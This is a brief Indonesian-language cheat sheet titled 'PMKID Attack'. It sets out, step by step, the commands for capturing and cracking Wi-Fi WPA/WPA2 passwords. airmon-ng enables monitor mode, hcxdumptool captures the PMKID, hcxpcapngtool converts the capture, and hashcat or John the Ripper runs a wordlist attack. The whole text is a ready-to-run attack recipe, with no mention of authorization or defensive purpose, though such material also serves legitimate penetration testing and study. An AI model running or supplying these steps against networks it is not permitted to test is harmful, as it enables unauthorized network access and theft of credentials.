# PMKID Attack

#### 1. Aktifkan Mode Monitor

```
airmon-ng check kill
airmon-ng start [interface]
```

#### 2. Capture PMKID

```
hcxdumptool -i [interface] -w [output] --rds=2 --disable_disassociation --exitoneapol=1
```

#### 3. Convert Hasil Capture

Hashcat:

```
hcxpcapngtool [file_capture] -o [output]
```

John the Ripper:

```
hcxpcapngtool [file_capture] --john=[output]
```

#### 4. Crack Hash

Hashcat:

```
hashcat -a 0 -m 22000 [file_hash] [wordlist]
```

John the Ripper:

```
john --format=wpapsk --wordlist=[wordlist] [file_hash]
```
